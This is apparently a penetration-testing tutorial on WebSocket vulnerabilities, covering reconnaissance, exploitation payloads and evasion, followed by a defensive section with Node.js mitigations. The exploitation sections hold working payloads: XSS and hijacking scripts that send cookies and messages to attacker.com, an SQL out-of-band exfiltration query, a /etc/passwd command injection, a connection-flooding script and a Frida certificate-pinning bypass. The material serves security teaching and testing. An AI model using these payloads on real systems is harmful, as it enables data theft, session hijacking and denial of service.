## WebSockets Vulnerabilities

- **What WebSockets are**
  - A communication protocol providing full-duplex communication over a single TCP connection
  - Initiated via HTTP but maintains a persistent connection
  - Enables real-time data exchange between client and server
  - Characterized by `ws://` or `wss://` (secure) protocol scheme
  - Used for chat applications, live notifications, real-time updates, collaborative editing, and gaming
  - Differs from HTTP by maintaining a stateful connection and allowing bi-directional communication
  - Consists of a handshake (HTTP upgrade request) followed by message frames exchange

- **WebSockets communication flow**
  
  - **Connection establishment (handshake)**
    - Client sends an HTTP request with upgrade headers:
      ```http
      GET /chat HTTP/1.1
      Host: example.com
      Upgrade: websocket
      Connection: Upgrade
      Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
      Sec-WebSocket-Version: 13
      Origin: https://example.com
      ```
    - Server responds with status code 101 (Switching Protocols):
      ```http
      HTTP/1.1 101 Switching Protocols
      Upgrade: websocket
      Connection: Upgrade
      Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
      ```
  
  - **Message exchange**
    - After successful handshake, the protocol switches to WebSocket frames
    - Messages can be sent in either direction at any time
    - Data is transmitted in frames (binary or text)
    - Connection remains open until explicitly closed by either party

- **Common WebSockets vulnerabilities**
  
  - **Input-based vulnerabilities**
    - Similar to traditional web vulnerabilities but in WebSocket messages
    - Injection attacks (SQL, NoSQL, LDAP, etc.)
    - Cross-site scripting (XSS)
    - Server-side template injection
    - XML external entity (XXE) injection
    - Deserialization vulnerabilities
  
  - **Authentication and authorization issues**
    - Insufficient authentication checks for WebSocket connections
    - Missing authorization checks for sensitive operations
    - Relying solely on HTTP headers or cookies from handshake
    - Failure to validate session context for each message
  
  - **Information disclosure**
    - Leaking sensitive data through WebSocket responses
    - Verbose error messages revealing implementation details
    - Lack of message content encryption
    - Development information left in responses
  
  - **Cross-site WebSocket hijacking (CSWSH)**
    - CSRF vulnerability in WebSocket handshake
    - Allows attackers to establish WebSocket connections from malicious sites
    - Enables access to authenticated communication and data theft
    - Occurs due to missing CSRF protections on handshake

- **Identifying WebSocket endpoints**
  
  - **Active reconnaissance techniques**
    
    - **Inspecting browser traffic**
      - Using browser developer tools (Network tab, filter for WS/WSS)
      - Look for Upgrade headers in HTTP requests
      - Identify WebSocket frame data in network activity
    
    - **Analyzing client-side code**
      - Search JavaScript for WebSocket-related code:
        - `new WebSocket()`
        - `WebSocket()` constructor calls
        - `.onmessage`, `.onopen`, `.onclose` event handlers
      - Example code pattern:
        ```javascript
        const socket = new WebSocket('wss://example.com/socket');
        socket.onopen = function(event) {...}
        socket.onmessage = function(event) {...}
        ```
    
    - **Application feature analysis**
      - Identify real-time features likely using WebSockets:
        - Chat systems
        - Live notifications
        - Collaborative editing
        - Live updates (sports scores, stock tickers)
        - Interactive games
    
    - **Automated scanning**
      - Tools like OWASP ZAP or Burp Suite Pro can identify WebSocket connections
      - Custom scripts to enumerate WebSocket endpoints
  
  - **Using intercepting proxies**
    - Configure Burp Suite or OWASP ZAP as proxy
    - Enable WebSocket interception
    - Interact with application features suspected of using WebSockets
    - Examine WebSockets history tab for connections

- **Exploiting WebSocket message manipulation**
  
  - **Testing for input-based vulnerabilities**
    
    - **Identifying message structure**
      - Intercept WebSocket traffic to understand message format
      - Common formats include JSON, XML, or custom formats
      - Analyze data fields and their potential vulnerabilities
      - Example message:
        ```json
        {"action":"getMessage", "messageId":1337}
        ```
    
    - **Injecting malicious payloads**
      - Modify message content to include attack payloads
      - Test each parameter for different vulnerability types
      - Example SQL injection test:
        ```json
        {"username":"admin' OR 1=1--", "action":"getMessages"}
        ```
      - Example XSS test:
        ```json
        {"message":"<img src=x onerror=alert(1)>", "room":"general"}
        ```
    
    - **Testing for command injection**
      - Insert OS command characters in parameters
      - Example payload:
        ```json
        {"filename":"document.pdf; cat /etc/passwd"}
        ```
      - Look for command output or timing differences in responses
    
    - **Testing for SSTI**
      - Insert template expressions in message parameters
      - Example for various template engines:
        ```json
        {"message":"{{7*7}}", "room":"test"}
        {"message":"${7*7}", "room":"test"}
        {"message":"<%= 7*7 %>", "room":"test"}
        ```
      - Check if expressions are evaluated in responses
  
  - **Exploiting input validation flaws**
    
    - **Bypassing client-side validations**
      - Identify client-side validation in JavaScript
      - Use interception tools to bypass these checks
      - Send manipulated payloads directly via WebSocket
      - Example approach:
        ```
        1. Identify client-side validation: e.g., restricting message length
        2. Intercept and modify WebSocket message directly
        3. Send message exceeding allowed length
        ```
    
    - **Parameter tampering**
      - Modify parameter values beyond expected boundaries
      - Change parameter types (string → array, number → string)
      - Example JSON type confusion:
        ```json
        // Original
        {"itemId":123, "quantity":5}
        
        // Modified
        {"itemId":{"$ne":-1}, "quantity":{"$gt":1000}}
        ```
    
    - **Fuzzing WebSocket messages**
      - Automated testing with various inputs
      - Use tools like Burp Intruder or custom scripts
      - Example fuzzing script (Python):
        ```python
        import websocket
        import json
        
        payloads = ["'", "''", "\"", "<script>", "../../", ...]
        
        def test_payloads():
            ws = websocket.create_connection("ws://example.com/socket")
            for payload in payloads:
                message = {"search": payload, "action": "query"}
                ws.send(json.dumps(message))
                result = ws.recv()
                print(f"Payload: {payload}, Result: {result}")
            ws.close()
        ```
  
  - **Cross-site scripting (XSS) via WebSockets**
    
    - **Identifying XSS vulnerabilities**
      - Look for WebSocket messages that influence DOM content
      - Analyze how received messages are processed by client-side code
      - Test with simple XSS payloads:
        ```json
        {"message":"<img src=x onerror=alert(document.domain)>"}
        ```
    
    - **DOM-based XSS exploitation**
      - Identify vulnerable JavaScript that processes WebSocket data
      - Example vulnerable code:
        ```javascript
        socket.onmessage = function(event) {
            const data = JSON.parse(event.data);
            document.getElementById('messages').innerHTML += data.message;
        }
        ```
      - Craft payload to exploit innerHTML assignment:
        ```json
        {"message":"<img src=1 onerror='fetch(\"/api/user\").then(r=>r.json()).then(d=>fetch(\"https://attacker.com/steal?data=\"+btoa(JSON.stringify(d))))'>"}
        ```
    
    - **Persistent XSS via WebSockets**
      - Send malicious content that gets stored and broadcast to other users
      - Example attack flow:
        ```
        1. Send malicious message via WebSocket
        2. Server stores message
        3. Message is broadcast to all connected clients
        4. XSS payload executes in victims' browsers
        ```
      - Example payload for chat application:
        ```json
        {"action":"sendMessage", "room":"general", "message":"<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"}
        ```
  
  - **SQL injection via WebSockets**
    
    - **Testing for SQL injection**
      - Inject SQL syntax into message parameters
      - Look for error messages or behavioral changes
      - Example payloads:
        ```json
        {"userId":"1' OR '1'='1"}
        {"search":"test' UNION SELECT username,password FROM users--"}
        ```
    
    - **Blind SQL injection techniques**
      - Time-based detection:
        ```json
        {"userId":"1'; IF (1=1) WAITFOR DELAY '0:0:5'--"}
        ```
      - Boolean-based detection:
        ```json
        {"userId":"1' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1)>90--"}
        ```
    
    - **Extracting data via WebSockets**
      - Combine SQL injection with out-of-band techniques
      - Example OAST payload (MS SQL Server):
        ```json
        {"id":"1'; DECLARE @q VARCHAR(8000); SET @q=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree \"//'+@q+'.attacker.com/a\"')--"}
        ```

- **Exploiting WebSocket handshake vulnerabilities**
  
  - **Cross-site WebSocket hijacking (CSWSH)**
    
    - **Identifying CSWSH vulnerabilities**
      - Test if WebSocket handshake lacks CSRF protection
      - Check if authentication relies solely on cookies
      - Example vulnerable handshake request:
        ```http
        GET /socket HTTP/1.1
        Host: vulnerable-website.com
        Upgrade: websocket
        Connection: Upgrade
        Cookie: session=AUTHENTICATED_SESSION_COOKIE
        Sec-WebSocket-Key: ...
        Sec-WebSocket-Version: 13
        Origin: https://vulnerable-website.com
        ```
      - Missing CSRF token in the request indicates potential vulnerability
    
    - **Exploiting CSWSH**
      - Create an HTML page on an attacker-controlled site:
        ```html
        <script>
          var socket = new WebSocket('wss://vulnerable-website.com/socket');
          
          socket.onopen = function() {
            console.log('Connection established');
          };
          
          socket.onmessage = function(event) {
            fetch('https://attacker.com/steal?data=' + encodeURIComponent(event.data));
          };
        </script>
        ```
      - When victim visits the attacker's site, their browser establishes WebSocket connection
      - Victim's cookies are automatically included in handshake
      - Attacker can now receive victim's WebSocket messages
    
    - **Data theft via CSWSH**
      - Extract sensitive information from hijacked connection
      - Send authenticated commands as the victim
      - Example attack for chat application:
        ```javascript
        // Connection is established with victim's credentials
        socket.onopen = function() {
          // Request chat history
          socket.send(JSON.stringify({"action":"getMessages", "room":"confidential"}));
        };
        
        // Forward stolen data to attacker's server
        socket.onmessage = function(event) {
          fetch('https://attacker.com/collect?data=' + encodeURIComponent(event.data));
        };
        ```
  
  - **Header injection in WebSocket handshake**
    
    - **Testing for header manipulation**
      - Inject unexpected headers in handshake request
      - Target custom application-specific headers
      - Example modified handshake:
        ```http
        GET /socket HTTP/1.1
        Host: example.com
        Upgrade: websocket
        Connection: Upgrade
        X-Admin-Role: true
        X-Internal-Trusted: true
        Sec-WebSocket-Key: ...
        ```
    
    - **Exploiting custom header trust**
      - Identify headers that influence authorization decisions
      - Test headers like X-Forwarded-For, X-Original-IP, etc.
      - Example attack using X-Internal-Access header:
        ```http
        GET /socket HTTP/1.1
        Host: example.com
        Upgrade: websocket
        Connection: Upgrade
        X-Internal-Access: 1
        Sec-WebSocket-Key: ...
        ```
  
  - **Session-related vulnerabilities**
    
    - **Session fixation**
      - Test if WebSocket connections maintain same session across reconnects
      - Check if authentication state can be transferred to another session
    
    - **Session expiration bypass**
      - Establish WebSocket connection before session expires
      - Test if connection remains authenticated after session should expire
      - Example test approach:
        ```
        1. Authenticate and establish WebSocket connection
        2. Wait for session expiration time to pass
        3. Test if WebSocket connection still allows privileged actions
        ```

- **Advanced WebSocket exploitation techniques**
  
  - **Attacking WebSocket message framing**
    
    - **Binary message manipulation**
      - Identify and modify binary WebSocket messages
      - Test for type confusion vulnerabilities
      - Convert between text and binary formats to bypass filters
      - Example Python script for binary manipulation:
        ```python
        import websocket
        import struct
        
        ws = websocket.create_connection("ws://example.com/socket")
        
        # Create malicious binary payload
        payload = struct.pack(">I", 1337) + b"\x00\x01\x02" + b"MALICIOUS"
        
        # Send binary message
        ws.send_binary(payload)
        
        # Receive response
        response = ws.recv()
        print(response)
        ```
    
    - **Message fragmentation attacks**
      - Split malicious payload across multiple frames
      - Potentially bypass pattern-matching defenses
      - Requires low-level WebSocket frame manipulation
  
  - **WebSocket protocol downgrade**
    
    - **Version downgrade attacks**
      - Test with older WebSocket protocol versions
      - Example downgraded handshake:
        ```http
        GET /socket HTTP/1.1
        Host: example.com
        Upgrade: websocket
        Connection: Upgrade
        Sec-WebSocket-Key: ...
        Sec-WebSocket-Version: 8
        ```
      - Check for relaxed security in legacy protocol support
    
    - **WebSocket to HTTP downgrade**
      - Test if endpoint accepts both WebSocket and regular HTTP
      - Example:
        ```http
        POST /socket HTTP/1.1
        Host: example.com
        Content-Type: application/json
        
        {"action":"getMessage", "id":123}
        ```
      - Some endpoints may bypass WebSocket-specific protections
  
  - **WebSocket denial of service (DoS)**
    
    - **Connection flooding**
      - Create multiple WebSocket connections to exhaust server resources
      - Example script:
        ```python
        import websocket
        import threading
        
        def connect():
            while True:
                try:
                    ws = websocket.create_connection("ws://target.com/socket")
                    # Keep connection open
                    ws.recv()
                except:
                    continue
        
        # Create multiple connection threads
        for _ in range(500):
            threading.Thread(target=connect).start()
        ```
    
    - **Slow WebSocket attack**
      - Establish connections but send data at a very slow rate
      - Keep connections open to consume server resources
    
    - **Large message attacks**
      - Send extremely large WebSocket messages
      - Test message size handling and buffer management
      - Example:
        ```javascript
        let socket = new WebSocket("ws://example.com/socket");
        socket.onopen = function() {
            // Create large payload
            let payload = {"data": "A".repeat(10000000)};
            socket.send(JSON.stringify(payload));
        };
        ```
  
  - **WebSocket MITM attacks**
    
    - **Attacks against ws:// (non-secure) connections**
      - Intercept and modify traffic on open WiFi networks
      - ARP spoofing to intercept WebSocket messages
    
    - **SSL pinning bypass for wss:// connections**
      - Use tools like Frida to bypass SSL certificate validation
      - Example Frida script:
        ```javascript
        Java.perform(function() {
            let SSLContext = Java.use('javax.net.ssl.SSLContext');
            SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom').implementation = function(a, b, c) {
                let TrustManager = Java.registerClass({
                    name: 'com.example.TrustManager',
                    implements: [Java.use('javax.net.ssl.X509TrustManager')],
                    methods: {
                        checkClientTrusted: function(chain, authType) {},
                        checkServerTrusted: function(chain, authType) {},
                        getAcceptedIssuers: function() { return []; }
                    }
                });
                let TrustManagers = Java.array('javax.net.ssl.TrustManager', [TrustManager.$new()]);
                return this.init(a, TrustManagers, c);
            };
        });
        ```

- **Evasion techniques for bypassing WebSocket security controls**
  
  - **Bypassing input filters**
    
    - **Encoding payloads**
      - Use various encoding schemes to bypass filters
      - Base64 encoding:
        ```json
        {"message":"SGVsbG8gd29ybGQ=", "encoding":"base64"}
        ```
      - URL encoding:
        ```json
        {"action":"execute", "command":"%73%79%73%74%65%6d%28%27%6c%73%27%29"}
        ```
      - Unicode escape sequences:
        ```json
        {"message":"\u003cscript\u003ealert(1)\u003c/script\u003e"}
        ```
    
    - **Obfuscation techniques**
      - Split attack payload across multiple parameters
      - Use unexpected formats or data types
      - Example:
        ```json
        // Instead of direct XSS
        {"message":"<script>alert(1)</script>"}
        
        // Try obfuscation
        {"prefix":"<img ", "attribute":"src=x o", "suffix":"nerror=alert(1)>"}
        ```
    
    - **Polyglot payloads**
      - Create payloads valid in multiple contexts
      - Example XSS polyglot:
        ```json
        {"message":"javascript:/*-/*`/*\\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e"}
        ```
  
  - **Evading rate limits**
    
    - **Distributed attacks**
      - Use multiple IP addresses for connection attempts
      - Spread requests across different source addresses
    
    - **Timing analysis**
      - Identify rate-limiting patterns
      - Space requests to stay under detection thresholds
    
    - **Using multiple WebSocket connections**
      - Establish multiple connections to distribute attack traffic
      - Example technique:
        ```javascript
        // Create multiple connections
        let sockets = [];
        for (let i = 0; i < 10; i++) {
            sockets.push(new WebSocket('wss://example.com/socket'));
            
            sockets[i].onopen = function() {
                // Distribute attack payloads across connections
                setInterval(() => {
                    let payload = generatePayload(); // Custom function
                    sockets[i].send(payload);
                }, 5000);
            };
        }
        ```
  
  - **Origin header manipulation**
    
    - **Spoofing origin headers**
      - Modify Origin header in handshake to bypass origin checks
      - Some applications may have allowlists of trusted origins
      - Example:
        ```http
        GET /socket HTTP/1.1
        Host: target.com
        Upgrade: websocket
        Connection: Upgrade
        Origin: https://trusted-domain.com
        Sec-WebSocket-Key: ...
        ```
    
    - **Null origin bypass**
      - Use a null origin with sandboxed iframes
      - Example HTML:
        ```html
        <iframe sandbox="allow-scripts" src="data:text/html,<script>
          var ws = new WebSocket('wss://vulnerable-website.com/socket');
          ws.onmessage = function(e) {
            fetch('https://attacker.com/log?data=' + encodeURIComponent(e.data));
          };
        </script>"></iframe>
        ```
  
  - **Subverting authorization checks**
    
    - **Session riding**
      - Maintain authorized WebSocket connection
      - Reuse connection after user permissions change
      - Example scenario:
        ```
        1. User has admin role and establishes WebSocket
        2. Admin role is revoked in the system
        3. Test if existing WebSocket still has admin privileges
        ```
    
    - **Connection pooling attacks**
      - Target applications that reuse connections between users
      - Send malicious data that affects other users' connections

- **Prevention and mitigation**
  
  - **Secure WebSocket implementation**
    
    - **Use secure WebSocket protocol**
      - Always use wss:// (WebSockets over TLS) instead of ws://
      - Implement proper certificate validation
      - Example secure connection:
        ```javascript
        // Client-side
        const socket = new WebSocket('wss://example.com/socket');
        
        // Server-side (Node.js example)
        const https = require('https');
        const fs = require('fs');
        const WebSocket = require('ws');
        
        const server = https.createServer({
          cert: fs.readFileSync('/path/to/cert.pem'),
          key: fs.readFileSync('/path/to/key.pem')
        });
        
        const wss = new WebSocket.Server({ server });
        server.listen(443);
        ```
    
    - **Input validation**
      - Validate all WebSocket message contents
      - Use schema validation for structured messages
      - Example using JSON Schema (Node.js):
        ```javascript
        const Ajv = require('ajv');
        const ajv = new Ajv();
        
        const messageSchema = {
          type: 'object',
          properties: {
            action: { type: 'string', enum: ['getMessage', 'sendMessage'] },
            messageId: { type: 'integer', minimum: 1 },
            content: { type: 'string', maxLength: 1000 }
          },
          required: ['action'],
          additionalProperties: false
        };
        
        const validate = ajv.compile(messageSchema);
        
        wss.on('connection', function(ws) {
          ws.on('message', function(message) {
            try {
              const data = JSON.parse(message);
              const valid = validate(data);
              
              if (!valid) {
                return ws.send(JSON.stringify({error: 'Invalid message format'}));
              }
              
              // Process valid message
            } catch (e) {
              ws.send(JSON.stringify({error: 'Invalid JSON'}));
            }
          });
        });
        ```
    
    - **Output encoding**
      - Encode data sent to clients appropriately
      - Prevent XSS in WebSocket responses
      - Example (Node.js):
        ```javascript
        const escapeHTML = require('escape-html');
        
        wss.on('connection', function(ws) {
          // When sending messages that will be displayed in HTML
          function sendMessage(message) {
            const safeMessage = {
              text: escapeHTML(message.text),
              user: escapeHTML(message.user),
              timestamp: message.timestamp
            };
            ws.send(JSON.stringify(safeMessage));
          }
        });
        ```
  
  - **Authentication and authorization**
    
    - **CSRF protection for handshake**
      - Include CSRF tokens in WebSocket handshake
      - Example implementation:
        ```javascript
        // Server generates CSRF token and sends to client
        app.get('/get-csrf-token', (req, res) => {
          const csrfToken = generateToken();
          req.session.csrfToken = csrfToken;
          res.json({ csrfToken });
        });
        
        // Client includes token in handshake
        const socket = new WebSocket(
          `wss://example.com/socket?csrfToken=${csrfToken}`
        );
        
        // Server verifies token during handshake
        wss.on('connection', function(ws, req) {
          const csrfToken = new URL(req.url, 'https://example.com').searchParams.get('csrfToken');
          
          if (csrfToken !== req.session.csrfToken) {
            return ws.close(1008, 'Invalid CSRF token');
          }
          
          // Proceed with valid connection
        });
        ```
    
    - **Implement proper session handling**
      - Verify authentication for each WebSocket message
      - Don't rely solely on handshake authentication
      - Example:
        ```javascript
        wss.on('connection', function(ws, req) {
          ws.userId = authenticateUser(req);
          
          ws.on('message', function(message) {
            // Re-verify authorization for each action
            const data = JSON.parse(message);
            const canPerformAction = checkUserPermission(ws.userId, data.action);
            
            if (!canPerformAction) {
              return ws.send(JSON.stringify({error: 'Unauthorized'}));
            }
            
            // Process authorized request
          });
        });
        ```
    
    - **Connection authentication expiration**
      - Implement timeout for WebSocket connections
      - Require re-authentication for long-lived connections
      - Example:
        ```javascript
        wss.on('connection', function(ws, req) {
          // Set authentication timeout
          ws.authTimeout = setTimeout(() => {
            ws.send(JSON.stringify({action: 'requireReauth'}));
            ws.isAuthenticated = false;
          }, 1800000); // 30 minutes
          
          ws.on('message', function(message) {
            const data = JSON.parse(message);
            
            // Handle re-authentication
            if (data.action === 'reauthenticate') {
              ws.isAuthenticated = verifyCredentials(data.token);
              clearTimeout(ws.authTimeout);
              ws.authTimeout = setTimeout(/* Same as above */);
              return;
            }
            
            // Check authentication before processing
            if (!ws.isAuthenticated) {
              return ws.send(JSON.stringify({error: 'Authentication required'}));
            }
            
            // Process authenticated message
          });
          
          ws.on('close', function() {
            clearTimeout(ws.authTimeout);
          });
        });
        ```
  
  - **Rate limiting and monitoring**
    
    - **Implement connection and message limits**
      - Limit connections per IP/user
      - Restrict message frequency
      - Example implementation (Node.js):
        ```javascript
        const connections = new Map(); // IP -> count
        
        wss.on('connection', function(ws, req) {
          const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
          
          // Track connections per IP
          const count = connections.get(ip) || 0;
          if (count >= 5) { // Max 5 connections per IP
            ws.close(1008, 'Too many connections');
            return;
          }
          connections.set(ip, count + 1);
          
          // Track message rate
          let messageCount = 0;
          let messageReset = setInterval(() => {
            messageCount = 0;
          }, 10000); // Reset every 10 seconds
          
          ws.on('message', function(message) {
            messageCount++;
            if (messageCount > 50) { // Max 50 messages per 10 seconds
              ws.close(1008, 'Rate limit exceeded');
              return;
            }
            
            // Process message
          });
          
          ws.on('close', function() {
            connections.set(ip, connections.get(ip) - 1);
            clearInterval(messageReset);
          });
        });
        ```
    
    - **Implement robust logging**
      - Log WebSocket connections and important messages
      - Include client information and message metadata
      - Example logging setup:
        ```javascript
        wss.on('connection', function(ws, req) {
          const clientInfo = {
            ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
            userAgent: req.headers['user-agent'],
            userId: authenticateUser(req),
            timestamp: new Date().toISOString()
          };
          
          console.log(`WebSocket connection established: ${JSON.stringify(clientInfo)}`);
          
          ws.on('message', function(message) {
            try {
              const data = JSON.parse(message);
              // Log sensitive actions
              if (['deleteAccount', 'updatePermissions', 'adminAction'].includes(data.action)) {
                console.log(`Sensitive action: ${JSON.stringify({
                  ...clientInfo,
                  action: data.action,
                  timestamp: new Date().toISOString()
                })}`);
              }
            } catch (e) {
              // Invalid JSON
            }
          });
          
          ws.on('close', function(code, reason) {
            console.log(`WebSocket connection closed: ${JSON.stringify({
              ...clientInfo,
              code,
              reason,
              timestamp: new Date().toISOString()
            })}`);
          });
        });
        ```
